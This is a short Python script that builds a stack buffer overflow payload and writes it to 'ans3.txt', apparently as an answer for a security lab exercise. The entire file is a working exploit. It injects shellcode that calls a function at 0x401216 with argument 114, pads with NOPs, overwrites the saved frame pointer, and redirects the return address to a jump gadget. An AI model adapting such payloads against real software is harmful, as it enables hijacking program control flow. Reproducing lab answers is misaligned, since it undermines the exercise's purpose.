import struct
p64 = lambda x: struct.pack("<Q", x)

func1 = 0x401216        
jmp_xs = 0x401334       

stub  = b"\xbf\x72\x00\x00\x00"          # mov edi, 114
stub += b"\x48\xb8" + p64(func1)         # mov rax, func1
stub += b"\xff\xd0"                      # call rax

buf = stub.ljust(0x20, b"\x90")          

payload  = buf
payload += b"B"*8                       
payload += p64(jmp_xs)                   

payload = payload.ljust(0x40, b"C")

with open("ans3.txt","wb") as f:
    f.write(payload)